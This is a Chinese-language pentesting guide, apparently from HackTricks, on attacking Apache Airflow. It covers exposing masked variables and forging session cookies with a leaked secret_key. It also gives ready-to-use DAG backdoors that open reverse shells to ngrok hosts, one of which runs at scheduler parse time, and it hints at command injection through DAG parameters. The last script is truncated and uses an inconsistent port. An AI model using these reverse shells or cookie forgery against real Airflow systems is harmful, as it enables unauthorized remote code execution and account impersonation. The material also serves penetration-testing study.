# Apache Airflow 安全性

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>

## 基本信息

[**Apache Airflow**](https://airflow.apache.org) 用于 **调度和编排数据管道或工作流**。数据管道编排指的是序列化、协调、调度和管理来自不同来源的复杂 **数据管道**。这些数据管道提供的数据集可供商业智能应用程序和数据科学、支持大数据应用的机器学习模型使用。

基本上，Apache Airflow 允许您在某些事情（事件、cron）**发生时** **安排代码的执行**。

## 本地实验室

### Docker-Compose

您可以使用来自 [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) 的 **docker-compose 配置文件** 来启动一个完整的 apache airflow docker 环境。（如果您使用的是 MacOS，请确保为 docker VM 分配至少 6GB 的 RAM）。

### Minikube

运行 **apache airflow** 的一种简单方法是**使用 minikube 运行它**：
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow 配置

Airflow 可能会在其配置中存储**敏感信息**，或者您可能会发现配置较弱：

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

在开始攻击 Airflow 之前，您应该了解**权限如何工作**：

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## 攻击

### Web 控制台枚举

如果您有**访问 web 控制台**的权限，您可能能够访问以下部分或全部信息：

* **变量**（自定义敏感信息可能存储在此处）
* **连接**（自定义敏感信息可能存储在此处）
* 在 `http://<airflow>/connection/list/` 访问它们
* [**配置**](./#airflow-configuration)（敏感信息如 **`secret_key`** 和密码可能存储在此处）
* 列出**用户和角色**
* **每个 DAG 的代码**（可能包含有趣的信息）

### 检索变量值

变量可以存储在 Airflow 中，以便 **DAGs** 可以**访问**它们的值。这类似于其他平台的秘密。如果您有**足够的权限**，您可以在 GUI 中通过 `http://<airflow>/variable/list/` 访问它们。\
Airflow 默认会在 GUI 中显示变量的值，但根据[**这篇文章**](https://marclamberti.com/blog/variables-with-apache-airflow/)，可以设置一个**变量列表**，其**值**将在**GUI**中显示为**星号**。

![](<../../.gitbook/assets/image (79).png>)

然而，这些**值**仍然可以通过**CLI**（您需要有数据库访问权限）、**任意 DAG** 执行、访问变量端点的 **API**（需要激活 API），甚至是**GUI 本身**来**检索**！\
****要从 GUI 访问这些值，只需**选择您想访问的变量**，然后**点击 Actions -> Export**。\
另一种方式是对**隐藏值**进行**暴力破解**，使用**搜索过滤**直到获取它：

![](<../../.gitbook/assets/image (30).png>)

### 权限提升

如果**`expose_config`** 配置设置为 **True**，则从**用户角色**及以上的用户可以在网页中**读取**配置。在此配置中，**`secret_key`** 会显示，这意味着任何拥有此有效密钥的用户都可以**创建自己的签名 cookie 来冒充任何其他用户账户**。
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG 后门（Airflow 工作节点中的 RCE）

如果你拥有**写入权限**到**DAGs 存储位置**，你可以简单地**创建一个**将会给你发送**反向 shell**的 DAG。\
注意，这个反向 shell 将会在**airflow 工作容器**内执行：
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG 后门 (Airflow 调度器中的 RCE)

如果您设置某些内容在**代码根目录**中**执行**，在本文写作时，将在将其放入 DAG 文件夹后几秒钟内由调度器**执行**。
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG 创建

如果您设法**在 DAG 集群内部的机器上实施渗透**，您可以在 `dags/` 文件夹中创建新的**DAG 脚本**，它们将会在 DAG 集群内的**其他机器中复制**。

### DAG 代码注入

当您通过 GUI 执行 DAG 时，您可以向它**传递参数**。\
因此，如果 DAG 编码不当，可能会**容易受到命令注入的攻击**。\
这就是此 CVE 中发生的情况：[https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

您需要知道的所有信息，以**开始寻找 DAG 中的命令注入**，就是**参数**是通过代码**`dag_run.conf.get("param_name")`**来**访问**的。

此外，相同的漏洞可能发生在**变量**上（注意，如果有足够的权限，您可以在 GUI 中**控制变量的值**）。变量是通过以下方式**访问**：
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
如果它们例如在bash命令中使用，你可以执行命令注入。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在**HackTricks中看到你的公司广告**或者**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>
